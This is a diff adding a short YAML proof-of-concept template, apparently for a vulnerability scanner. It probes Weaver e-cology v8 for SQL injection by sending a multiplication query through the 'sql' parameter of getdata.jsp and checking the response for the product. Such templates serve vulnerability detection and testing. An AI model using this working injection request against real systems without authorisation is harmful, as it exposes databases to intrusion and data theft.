@@ -1,0 +1,20 @@
+﻿params: []
+name: poc-yaml-ecology-v8-sqli
+set:
+  r1: randomInt(1000, 9999)
+  r2: randomInt(1000, 9999)
+rules:
+- method: GET
+  path: /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+{{r1}}*{{r2}}+as+id
+  headers: {}
+  body: ""
+  search: ""
+  followredirects: false
+  expression: |
+    response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+groups: {}
+detail:
+  author: ""
+  links: []
+  description: ""
+  version: ""
